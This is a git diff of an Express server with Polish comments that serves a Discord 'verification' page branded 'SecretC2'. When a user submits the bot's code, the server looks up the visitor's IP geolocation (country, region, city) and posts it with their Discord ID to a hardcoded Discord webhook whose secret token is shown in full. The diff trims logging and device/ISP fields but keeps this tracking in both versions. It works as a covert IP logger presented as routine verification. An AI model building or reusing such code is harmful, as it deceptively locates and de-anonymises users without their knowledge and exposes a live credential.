@@ -43,7 +43,7 @@ async function getIPInfo(ip) {
   };
 }
 
-// Endpoint do rejestracji kodu (wywoływany przez bota)
+// Endpoint do rejestracji kodu (będzie wywoływany przez bota)
 app.post('/api/register-code', (req, res) => {
   const { code, userId } = req.body;
   
@@ -64,11 +64,10 @@ app.post('/api/register-code', (req, res) => {
     }
   }
   
-  console.log(`📝 Kod ${code} zarejestrowany dla ${userId}`);
   res.json({ success: true });
 });
 
-// Strona weryfikacji - TYLKO KOD, ID Z LINKU
+// Strona weryfikacji
 app.get('/', (req, res) => {
   const { code, userId } = req.query;
   
@@ -173,23 +172,22 @@ app.get('/', (req, res) => {
           color: #999;
           text-align: center;
         }
-        .hidden {
-          display: none;
-        }
       </style>
     </head>
     <body>
       <div class="container">
         <h1>🔐 Weryfikacja - SecretC2</h1>
-        <div class="code-display" id="codeDisplay">${code || 'Wpisz kod'}</div>
+        <div class="code-display" id="codeDisplay">${code || '------'}</div>
         
         <div class="form-group">
           <label for="code">Kod weryfikacyjny</label>
           <input type="text" id="code" placeholder="Wpisz kod" value="${code || ''}">
         </div>
         
-        <!-- Ukryte pole z ID użytkownika -->
-        <input type="hidden" id="userId" value="${userId || ''}">
+        <div class="form-group">
+          <label for="userId">ID użytkownika</label>
+          <input type="text" id="userId" placeholder="ID z Discorda" value="${userId || ''}">
+        </div>
         
         <button onclick="verify()">Zweryfikuj</button>
         
@@ -203,15 +201,9 @@ app.get('/', (req, res) => {
           const userId = document.getElementById('userId').value;
           const messageDiv = document.getElementById('message');
           
-          if(!code) {
+          if(!code || !userId) {
             messageDiv.className = 'message error';
-            messageDiv.textContent = 'Wpisz kod weryfikacyjny!';
-            return;
-          }
-          
-          if(!userId) {
-            messageDiv.className = 'message error';
-            messageDiv.textContent = 'Brak ID użytkownika - wróć na Discorda i kliknij przycisk ponownie!';
+            messageDiv.textContent = 'Wpisz kod i ID użytkownika!';
             return;
           }
           
@@ -242,15 +234,9 @@ app.get('/', (req, res) => {
           const code = urlParams.get('code');
           const userId = urlParams.get('userId');
           
-          if(code) {
-            document.getElementById('code').value = code;
-          }
-          if(userId) {
-            document.getElementById('userId').value = userId;
-          }
-          
-          // Auto-weryfikacja jeśli mamy i kod i userId
           if(code && userId) {
+            document.getElementById('code').value = code;
+            document.getElementById('userId').value = userId;
             verify();
           }
         }
@@ -265,17 +251,13 @@ app.post('/api/verify', async (req, res) => {
   const { code, userId } = req.body;
   const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   
-  console.log(`🔍 Próba weryfikacji: kod=${code}, userId=${userId}, ip=${clientIp}`);
-  
   if (!code || !userId) {
-    console.log('❌ Brak kodu lub userId');
     return res.json({ success: false, message: 'Brak kodu lub userId' });
   }
   
   // Sprawdź czy kod istnieje i jest ważny
   const stored = validCodes.get(code);
   if (!stored || stored.userId !== userId || stored.expires < Date.now()) {
-    console.log(`❌ Nieprawidłowy kod: ${code}`);
     return res.json({ success: false, message: 'Nieprawidłowy lub wygasły kod!' });
   }
   
@@ -284,13 +266,10 @@ app.post('/api/verify', async (req, res) => {
   
   // Pobierz info o IP
   const ipInfo = await getIPInfo(clientIp);
-  console.log(`🌐 Info o IP: ${JSON.stringify(ipInfo)}`);
   
-  // Wyślij log na Discorda przez webhook
+  // Wyślij log na Discorda przez webhook (opcjonalnie)
   try {
-    const webhookUrl = 'https://discord.com/api/webhooks/1482626978367537205/VC5fSNon0vk09yTW1vjnWHTw1-D1S5kaC9YmYeswvZaiT5BRCv42T01NLWqN_kQWNS1z';
-    
-    const webhookData = {
+    await axios.post('https://discordapp.com/api/webhooks/1482626978367537205/VC5fSNon0vk09yTW1vjnWHTw1-D1S5kaC9YmYeswvZaiT5BRCv42T01NLWqN_kQWNS1z', {
       embeds: [{
         title: '✅ Nowa weryfikacja',
         color: 0x00ff00,
@@ -305,26 +284,13 @@ app.post('/api/verify', async (req, res) => {
             `**Kraj:** ${ipInfo.country}\n` +
             `**Region:** ${ipInfo.region}\n` +
             `**Miasto:** ${ipInfo.city}`, inline: false
-          },
-          { name: '💻 DEVICE INFORMATION', value:
-            `**Urządzenie:** ${req.headers['user-agent']?.substring(0, 50) || 'Nieznane'}\n` +
-            `**Provider:** ${ipInfo.isp}\n` +
-            `**Typ:** ${ipInfo.type}`, inline: false
           }
         ],
-        timestamp: new Date().toISOString(),
-        footer: { text: 'SecretC2 - System weryfikacji' }
+        timestamp: new Date().toISOString()
       }]
-    };
-    
-    const webhookResponse = await axios.post(webhookUrl, webhookData);
-    console.log(`✅ Webhook wysłany, status: ${webhookResponse.status}`);
+    });
   } catch(e) {
-    console.error('❌ BŁĄD WEBHOOKA:', e.message);
-    if (e.response) {
-      console.error('Status błędu:', e.response.status);
-      console.error('Dane błędu:', e.response.data);
-    }
+    console.error('Błąd webhooka:', e.message);
   }
   
   res.json({ 
@@ -336,5 +302,4 @@ app.post('/api/verify', async (req, res) => {
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`🚀 Serwer weryfikacji działa na porcie ${PORT}`);
-  console.log(`🌐 Webhook URL: https://discord.com/api/webhooks/1482626978367537205/VC5fSNon0vk09yTW1vjnWHTw1-D1S5kaC9YmYeswvZaiT5BRCv42T01NLWqN_kQWNS1z`);
 });
